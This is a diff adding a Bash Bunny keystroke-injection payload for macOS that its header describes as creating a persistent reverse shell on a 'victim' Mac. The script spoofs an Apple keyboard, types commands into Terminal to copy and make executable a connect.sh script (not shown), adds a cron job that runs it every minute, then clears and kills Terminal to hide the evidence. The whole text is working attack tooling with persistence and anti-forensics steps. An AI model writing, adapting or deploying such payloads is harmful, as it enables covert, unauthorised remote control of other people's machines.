@@ -1,0 +1,50 @@
+# Title:         Reverse Bash Shell Mac
+# Description:   Creates a persistent reverse shell on Mac victim that connects back to NetCat host
+# Author:        0dyss3us (KeenanV)
+# Props:
+# Version:       1.0
+# Category:      Remote Access
+# Target:        MacOS
+# Attackmodes:   HID, Storage
+
+#Sets attack modes and stores current switch position
+LED SETUP
+ATTACKMODE HID STORAGE VID_0X05AC PID_0X021E
+GET_SWITCH_POSITION
+
+#Moves the shell script connect.sh to victim machine and makes it excecutable
+LED STAGE1
+RUN OSX terminal
+Q DELAY 2000
+Q STRING mkdir \~/Library/Misc
+Q ENTER
+Q DELAY 1000
+Q STRING cp /Volumes/BashBunny/payloads/$SWITCH_POSITION/connect.sh \~/Library/Misc
+Q ENTER
+Q DELAY 2000
+Q STRING chmod +x \~/Library/Misc/connect.sh
+Q ENTER
+Q DELAY 1000
+
+LED STAGE2
+#Makes a cron job that will run the script once every minute
+Q STRING crontab -e
+Q ENTER
+Q DELAY 1000
+Q STRING i
+Q DELAY 500
+Q STRING \*/1 \* \* \* \* cd \~/Library/Misc \&\& ./connect.sh
+Q ESC
+Q DELAY 500
+Q STRING :wq
+Q ENTER
+Q DELAY 2000
+
+LED CLEANUP
+#Clears and kills the terminal to hide the evidence
+Q STRING clear
+Q ENTER
+DELAY 500
+Q STRING killall Terminal
+Q ENTER
+LED FINISH
